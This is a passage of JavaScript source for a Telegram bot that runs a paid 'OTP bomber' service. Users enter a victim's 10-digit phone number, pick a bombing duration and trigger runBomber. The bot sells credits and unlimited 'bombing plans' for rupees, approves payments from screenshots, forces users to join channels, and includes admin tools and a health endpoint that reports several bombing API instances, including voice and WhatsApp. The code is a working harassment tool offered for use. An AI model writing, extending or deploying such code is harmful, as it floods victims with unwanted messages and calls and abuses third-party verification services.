                bot.sendMessage(chatId, `✅ Redeemed ${amount} credits!`);
            }
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'enter_phone') {
            const phone = input.replace(/\D/g, '');
            if (phone.length !== 10) return bot.sendMessage(chatId, '❌ Invalid number! Must be 10 digits.');
            
            const isProtected = await isNumberProtected(phone);
            if (isProtected) {
                return bot.sendMessage(chatId, '⚠️ This number is PROTECTED!\nBombing not allowed!');
            }
            
            userStates.set(chatId, { phone: phone });
            const keyboard = getDurationButtons(user);
            bot.sendMessage(chatId, `📱 Target: <code>${phone}</code>\n⏱️ <b>Select Bombing Duration:</b>`, {
                parse_mode: 'HTML',
                reply_markup: keyboard.reply_markup
            });
            return;
        }

        if (state.state === 'gen_code') {
            const amount = parseInt(input);
            if (isNaN(amount) || amount <= 0 || amount > 1000) return bot.sendMessage(chatId, '❌ Invalid amount. Max 1000.');
            const code = 'RTF' + Math.random().toString(36).substring(2, 7).toUpperCase();
            await createRedeemCode(code, amount);
            bot.sendMessage(chatId, `✅ Code: <code>${code}</code>\nAmount: ${amount} credits`, { parse_mode: 'HTML' });
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'ban_user') {
            const id = parseInt(input);
            if (isNaN(id)) return bot.sendMessage(chatId, '❌ Invalid ID.');
            await banUser(id);
            bot.sendMessage(chatId, `✅ Banned ${id}`);
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'unban_user') {
            const id = parseInt(input);
            if (isNaN(id)) return bot.sendMessage(chatId, '❌ Invalid ID.');
            await unbanUser(id);
            bot.sendMessage(chatId, `✅ Unbanned ${id}`);
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'add_credits') {
            const uid = parseInt(input);
            if (isNaN(uid)) return bot.sendMessage(chatId, '❌ Invalid ID.');
            userStates.set(chatId, { state: 'add_credits_amount', uid });
            bot.sendMessage(chatId, '💰 Send amount to add:');
            return;
        }
        if (state.state === 'add_credits_amount') {
            const amount = parseInt(input);
            if (isNaN(amount) || amount <= 0) return bot.sendMessage(chatId, '❌ Invalid amount.');
            await updateCredits(state.uid, amount);
            bot.sendMessage(chatId, `✅ Added ${amount} credits to ${state.uid}`);
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'unlimited_plan') {
            const uid = parseInt(input);
            if (isNaN(uid)) return bot.sendMessage(chatId, '❌ Invalid ID.');
            const target = await getUser(uid);
            target.daily_unlimited = Date.now() / 1000 + 86400;
            await target.save();
            bot.sendMessage(chatId, `✅ 1-Day Unlimited plan granted to user ${uid} for 24 hours!`);
            try {
                await bot.sendMessage(uid, '⭐ <b>You\'ve been granted a 1-Day Unlimited Bombing Plan!</b>\n\nYou can now bomb any number for free for the next 24 hours!', { parse_mode: 'HTML' });
            } catch (e) {}
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'allusers') {
            return;
        }
    }
});

// ============================================================
// ===== CALLBACK QUERY HANDLER =====
// ============================================================

bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
    const msgId = callbackQuery.message.message_id;

    if (data === 'verify_join') {
        const result = await checkChannelJoin(chatId, bot);
        if (result.joined) {
            await bot.editMessageText('✅ You have joined all channels! Access granted.', { chat_id: chatId, message_id: msgId });
            await showMainMenu(chatId);
        } else {
            const keyboard = await getChannelJoinButtons(chatId);
            let msgText = `❌ <b>You still haven't joined all channels!</b>\n\n`;
            for (const ch of result.unjoined) {
                msgText += `• ${ch}\n`;
            }
            msgText += `\nPlease join all channels and click the button again.`;
            await bot.editMessageText(msgText, { 
                chat_id: chatId, 
                message_id: msgId,
                parse_mode: 'HTML',
                reply_markup: keyboard 
            });
            bot.answerCallbackQuery(callbackQuery.id, { text: '❌ You still haven\'t joined all channels.', show_alert: true });
        }
        return;
    }

    if (data.startsWith('dur_')) {
        const dur = parseInt(data.split('_')[1]);
        const state = userStates.get(chatId);
        if (state && state.phone) {
            const phone = state.phone;
            userStates.delete(chatId);
            await runBomber(chatId, phone, dur);
        } else {
            bot.sendMessage(chatId, '❌ Please enter phone number first.');
        }
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data.startsWith('buy_')) {
        const planKey = data.replace('buy_', '');
        await handleBuyCredits(chatId, planKey);
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // ===== PAYMENT APPROVAL =====
    if (data.startsWith('approve_pay_')) {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
        }

        const payId = data.replace('approve_pay_', '');
        const payment = pendingScreenshots.get(payId);
        
        if (!payment) {
            return bot.editMessageText('❌ Payment not found or already processed.', { chat_id: chatId, message_id: msgId });
        }

        const userId = payment.userId;
        const credits = payment.credits;
        const isLifetime = payment.lifetime || false;
        
        try {
            if (isLifetime) {
                const user = await getUser(userId);
                user.lifetime_unlimited = true;
                await user.save();
            } else if (credits > 0) {
                await updateCredits(userId, credits);
            } else {
                const user = await getUser(userId);
                user.daily_unlimited = Date.now() / 1000 + 86400;
                await user.save();
            }

            payment.status = 'approved';
            pendingScreenshots.set(payId, payment);

            try {
                const msgText = isLifetime ? 
                    `🎉 <b>Payment Approved!</b>\n\n✅ Your payment of ₹${payment.price} has been approved.\n🔮 <b>Lifetime Unlimited Plan Activated Forever!</b>\n\nUse START BOMB to start bombing!` :
                    `🎉 <b>Payment Approved!</b>\n\n✅ Your payment of ₹${payment.price} has been approved.\n💰 ${credits > 0 ? `Added ${credits} credits!` : '⭐ Unlimited Plan Activated for 24 hours!'}\n\nUse START BOMB to start bombing!`;
                await bot.sendMessage(userId, msgText, { parse_mode: 'HTML' });
            } catch (e) {}

            await bot.editMessageText(
                `✅ <b>Payment Approved!</b>\n\n` +
                `👤 User: ${payment.first_name}\n` +
                `💳 Plan: ${payment.plan}\n` +
                `💰 Amount: ₹${payment.price}\n` +
                `✅ Status: APPROVED${isLifetime ? ' (Lifetime)' : ''}`,
                { chat_id: chatId, message_id: msgId, parse_mode: 'HTML' }
            );

            pendingScreenshots.delete(payId);

        } catch (error) {
            bot.editMessageText(`❌ Error: ${error.message}`, { chat_id: chatId, message_id: msgId });
        }

        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment approved!' });
        return;
    }

    if (data.startsWith('reject_pay_')) {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
        }

        const payId = data.replace('reject_pay_', '');
        const payment = pendingScreenshots.get(payId);

        if (!payment) {
            return bot.editMessageText('❌ Payment not found.', { chat_id: chatId, message_id: msgId });
        }

        payment.status = 'rejected';
        pendingScreenshots.set(payId, payment);

        try {
            await bot.sendMessage(payment.userId,
                `❌ <b>Payment Rejected</b>\n\n` +
                `Your payment of ₹${payment.price} was rejected.\n\n` +
                `Please try again with a clear screenshot.`,
                { parse_mode: 'HTML' }
            );
        } catch (e) {}

        await bot.editMessageText(
            `❌ <b>Payment Rejected</b>\n\n` +
            `👤 User: ${payment.first_name}\n` +
            `💳 Plan: ${payment.plan}\n` +
            `💰 Amount: ₹${payment.price}\n` +
            `❌ Status: REJECTED`,
            { chat_id: chatId, message_id: msgId, parse_mode: 'HTML' }
        );

        pendingScreenshots.delete(payId);
        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Payment rejected' });
        return;
    }

    // ===== CHANNEL MANAGER =====
    if (data === 'channel_add_public') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        await bot.editMessageText('📺 Send public channel username to add (e.g., @channelname):', { chat_id: chatId, message_id: msgId });
        userStates.set(chatId, { state: 'add_channel_public' });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data === 'channel_add_private') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        await bot.editMessageText('🔒 Send private channel username to add (e.g., @privatechannel):', { chat_id: chatId, message_id: msgId });
        userStates.set(chatId, { state: 'add_channel_private' });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data === 'channel_add_link') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        await bot.editMessageText('🔗 Send private channel invite link to add (e.g., https://t.me/+XXXX):', { chat_id: chatId, message_id: msgId });
        userStates.set(chatId, { state: 'add_channel_link' });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data === 'channel_remove') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        const channels = await getChannels();
        const privateChannels = await getPrivateChannels();
        const privateLinks = await getPrivateLinks();
        const allChannels = [...channels, ...privateChannels];
        if (allChannels.length === 0 && privateLinks.length === 0) {
            await bot.editMessageText('📭 No channels/links to remove.', { chat_id: chatId, message_id: msgId });
            return bot.answerCallbackQuery(callbackQuery.id);
        }
        let msg = '📺 <b>Current Channels:</b>\n\n';
        if (channels.length) msg += '🔓 Public:\n' + channels.join('\n') + '\n\n';
        if (privateChannels.length) msg += '🔒 Private:\n' + privateChannels.join('\n') + '\n\n';
        if (privateLinks.length) msg += '🔗 Private Links:\n' + privateLinks.join('\n') + '\n\n';
        msg += 'Send channel username or link to remove:';
        await bot.editMessageText(msg, { chat_id: chatId, message_id: msgId, parse_mode: 'HTML' });
        userStates.set(chatId, { state: 'remove_channel' });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data === 'channel_view') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        const channels = await getChannels();
        const privateChannels = await getPrivateChannels();
        const privateLinks = await getPrivateLinks();
        let msg = '📺 <b>Required Channels:</b>\n\n';
        if (channels.length) msg += '🔓 Public:\n' + channels.join('\n') + '\n\n';
        if (privateChannels.length) msg += '🔒 Private:\n' + privateChannels.join('\n') + '\n\n';
        if (privateLinks.length) msg += '🔗 Private Links:\n' + privateLinks.join('\n') + '\n\n';
        if (!channels.length && !privateChannels.length && !privateLinks.length) msg = '📭 No channels/links configured.';
        await bot.editMessageText(msg, { chat_id: chatId, message_id: msgId, parse_mode: 'HTML' });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data === 'admin_back') {
        await bot.editMessageText('🔐 Admin Panel', { chat_id: chatId, message_id: msgId });
        const adminKb = adminKeyboard();
        bot.sendMessage(chatId, '🔐 Admin Panel', { 
            reply_markup: adminKb.reply_markup 
        });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data.startsWith('allusers_')) {
        const page = parseInt(data.split('_')[1]);
        const state = userStates.get(chatId);
        if (state && state.state === 'allusers') {
            const start = page * state.perPage;
            const end = start + state.perPage;
            const chunk = state.users.slice(start, end);
            let msg = '👥 <b>ALL USERS</b>\n\n';
            chunk.forEach(u => {
                msg += `🆔 <code>${u._id}</code> | @${u.username || 'no_username'} | 💰${u.credits} | 👥${u.total_referrals || 0}\n`;
            });
            msg += `\nPage ${page+1}/${state.totalPages}`;
            const markup = totalPages > 1 ? {
                reply_markup: {
                    inline_keyboard: [
                        ...(page > 0 ? [{ text: '◀️ Prev', callback_data: `allusers_${page-1}` }] : []),
                        ...(page < state.totalPages-1 ? [{ text: 'Next ▶️', callback_data: `allusers_${page+1}` }] : [])
                    ]
                }
            } : undefined;
            await bot.editMessageText(msg, { chat_id: chatId, message_id: msgId, parse_mode: 'HTML', ...markup });
            state.page = page;
            userStates.set(chatId, state);
        }
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }
});

// ============================================================
// ===== WEBHOOK ENDPOINT (1.4) =====
// ============================================================

if (USE_WEBHOOK) {
    const webhookApp = express();
    webhookApp.use(express.json());
    webhookApp.post('/webhook', (req, res) => {
        bot.processUpdate(req.body);
        res.sendStatus(200);
    });
    webhookApp.listen(process.env.WEBHOOK_PORT || 8443, () => {
        console.log('Webhook server listening on port', process.env.WEBHOOK_PORT || 8443);
    });
}

// ============================================================
// ===== INIT – CHECK QR CODE IN DB =====
// ============================================================

(async () => {
    const qr = await getQRCode();
    if (qr) {
        qrCodeSet = true;
        console.log('✅ QR Code found in database.');
    } else {
        console.log('⚠️ No QR Code in database. Admin can set one.');
    }
})();

// ============================================================
// ===== HEALTH CHECK SERVER (WITH COMPRESSION) =====
// ============================================================

const healthApp = express();
healthApp.use(compression()); // 1.6 Compression & Minify

// ===== ROOT ROUTE – FOR UPTIMEROBOT =====
healthApp.get('/', (req, res) => {
    res.send('🤖 OTP Bomber Bot is running!');
});

// ===== HEALTH CHECK ROUTE =====
healthApp.get('/health', (req, res) => {
    const mem = process.memoryUsage();
    res.json({
        status: 'ok',
        uptime: process.uptime(),
        memory: {
            heapUsed: (mem.heapUsed / 1024 / 1024).toFixed(2) + 'MB',
            heapTotal: (mem.heapTotal / 1024 / 1024).toFixed(2) + 'MB',
            rss: (mem.rss / 1024 / 1024).toFixed(2) + 'MB'
        },
        activeBombing: bombingStatus.size,
        qrCodeSet: qrCodeSet,
        pendingPayments: pendingScreenshots.size,
        loadBalancer: 'Active',
        apiInstances: Object.keys(API_URLS).length,
        api5Type: 'Voice & WhatsApp Only',
        features: {
            colorfulMainKeyboard: true,
            botApiVersion: '7.4+',
            lifetimeUnlimited: true,
            referralSystem: true,
            privateChannels: true,
            privateLinks: true,
            numberProtection: true,
            perSecondStats: true
        }
    });
});

// ===== FALLBACK ROUTE – CATCH ALL =====
healthApp.get('*', (req, res) => {
    res.status(404).send('❌ Route not found. Use /health for status.');
});

const PORT = process.env.PORT || 10000;
healthApp.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Health check server listening on port ${PORT}`);
});

console.log('🤖 ULTIMATE Bot started successfully!');
console.log(`📡 Load Balancer: FAST MODE ACTIVE`);
console.log(`🌐 API Instances: 6 (API6: External)`);
console.log(`⚡ Concurrency: ${API_CONCURRENCY} parallel requests`);
console.log(`💾 Caching: Enabled (TTL ${CACHE_TTL/1000}s)`);
console.log(`🌐 Webhook mode: ${USE_WEBHOOK ? 'ENABLED' : 'Polling'}`);
console.log(`📦 Compression: Enabled`);
console.log(`🎨 Colorful Main Keyboard: ACTIVE (Bot API 7.4+)`);
console.log(`⭐ Plans: 1 Day (₹50) | Lifetime (₹400)`);
console.log(`🛡️ Number Protection: Admin-Only`);
console.log(`🔗 Private Links: SUPPORTED`);
console.log(`📊 Per-Second Stats: ACTIVE (Updates every 5s)`);
console.log(`👥 Referral System: ACTIVE (Only referrer gets credits)`);
console.log(`📸 QR Code stored in MongoDB: ${qrCodeSet ? '✅' : '❌'}`);
console.log(`💳 Screenshot approval system: ✅`);
console.log(`📢 Broadcast system: ✅ (No prefix)`);
console.log(`👑 Admin panel: ✅`);
console.log(`💬 Direct Message: ✅ (forwardMessage)`);
console.log(`📦 Data Backup: ✅ (Fixed null checks)`);
console.log(`📝 parse_mode: HTML (Fixed parsing errors)`);
console.log(`🔒 Lifetime users: 1-Day option hidden on bomb duration`);
console.log(`⏱️ Bombing timer: ✅ Fixed for Lifetime users`);
console.log(`🌐 API6: Active up to 10 minutes (Dynamic rate limiting)`);
console.log(`📊 MongoDB indexes: ✅ Created`);
